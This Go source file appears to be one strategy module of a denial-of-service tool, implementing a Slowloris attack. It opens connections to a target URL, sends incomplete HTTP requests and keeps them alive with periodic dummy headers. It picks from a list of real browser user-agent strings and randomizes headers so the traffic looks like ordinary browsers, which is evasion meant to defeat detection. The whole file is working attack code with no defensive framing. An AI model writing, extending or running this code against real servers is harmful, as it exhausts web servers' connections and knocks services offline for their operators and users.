package strategy

import (
	"context"
	"fmt"
	"math/rand"
	"net/url"
	"strings"
	"sync/atomic"
	"time"
)

// Slowloris implements the Slowloris attack with browser mimicry.
// It sends incomplete HTTP requests with Connection: keep-alive header
// to appear as a legitimate browser while holding server connections.
type Slowloris struct {
	keepAliveInterval time.Duration
	connConfig        ConnConfig
	headerRandomizer  *HeaderRandomizer
	userAgents        []string
	activeConnections int64
}

var defaultUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
}

func NewSlowloris(keepAliveInterval time.Duration, bindIP string) *Slowloris {
	return &Slowloris{
		keepAliveInterval: keepAliveInterval,
		connConfig:        DefaultConnConfig(bindIP),
		headerRandomizer:  DefaultHeaderRandomizer(),
		userAgents:        defaultUserAgents,
	}
}

func (s *Slowloris) Execute(ctx context.Context, target Target) error {
	mc, parsedURL, err := DialManaged(ctx, target.URL, s.connConfig, &s.activeConnections)
	if err != nil {
		return err
	}
	defer mc.Close()

	userAgent := s.userAgents[rand.Intn(len(s.userAgents))]

	// Send incomplete HTTP request with browser-like headers
	incompleteRequest := s.headerRandomizer.BuildIncompleteRequest(parsedURL, userAgent)

	if _, err := mc.WriteWithTimeout([]byte(incompleteRequest), 5*time.Second); err != nil {
		return err
	}

	ticker := time.NewTicker(s.keepAliveInterval)
	defer ticker.Stop()

	for {
		select {
		case <-mc.Context().Done():
			return nil
		case <-ticker.C:
			header := GenerateDummyHeader()
			if _, err := mc.WriteWithTimeout([]byte(header), 5*time.Second); err != nil {
				return err
			}
		}
	}
}

func (s *Slowloris) Name() string {
	return "slowloris"
}

func (s *Slowloris) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}

func parseTargetURL(targetURL string) (*url.URL, string, bool, error) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil, "", false, fmt.Errorf("invalid URL: %w", err)
	}

	scheme := strings.ToLower(parsed.Scheme)
	if scheme != "http" && scheme != "https" {
		if scheme == "" {
			return nil, "", false, fmt.Errorf("missing scheme: URL must start with http:// or https:// (got: %s)", targetURL)
		}
		return nil, "", false, fmt.Errorf("unsupported scheme: %s (only http/https allowed)", scheme)
	}

	host := parsed.Host
	if host == "" {
		return nil, "", false, fmt.Errorf("missing host in URL")
	}

	useTLS := scheme == "https"

	if !strings.Contains(host, ":") {
		if useTLS {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	return parsed, host, useTLS, nil
}
